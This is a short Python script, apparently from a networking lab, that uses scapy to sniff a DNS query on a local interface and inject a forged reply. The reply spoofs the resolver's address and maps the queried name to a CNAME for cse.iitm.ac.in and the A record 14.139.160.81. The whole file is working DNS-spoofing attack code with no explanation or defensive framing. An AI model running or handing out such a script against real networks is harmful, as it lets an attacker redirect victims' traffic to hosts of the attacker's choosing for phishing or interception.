from scapy.all import *

interface = "enp0s3"
filter_bpf = "udp and port 53"


def dnsResp(x):
	ip = x[IP]
	dns = x[DNS]

	send(IP(dst=ip.src, src=ip.dst, proto=17)
		/UDP(chksum=None, dport=ip.sport, sport=ip.dport)
		/DNS(id=dns.id,
			qr=1,
			ra=1,
			opcode=0,
			ancount=2,
			qd=dns.qd,
			an=DNSRR(rrname=dns.qd.qname,
				type='CNAME',
				rclass='IN',
				ttl=86253,
				rdata='cse.iitm.ac.in')
			/DNSRR(rrname=dns.qd.qname, 
				type='A', 
				ttl=86253, 
				rdata='14.139.160.81', 
				rclass='IN')))
	
	return

sniff(iface = interface, filter = filter_bpf, prn = dnsResp, count = 1)
